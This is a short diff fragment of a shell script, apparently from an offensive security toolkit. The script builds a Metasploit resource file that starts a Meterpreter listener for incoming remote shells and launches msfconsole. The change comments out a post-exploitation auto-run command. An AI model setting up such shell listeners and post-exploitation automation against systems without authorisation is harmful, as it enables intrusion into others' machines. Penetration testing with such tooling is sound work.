@@ -299,7 +299,7 @@ do
             echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter.rc
             echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
-            echo set AutoRunScript post/multi/gather/multi_command RESOURCE=/root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
+#           echo set AutoRunScript post/multi/gather/multi_command RESOURCE=/root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter.rc
             cat ~/Desktop/temp/meterpreter.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
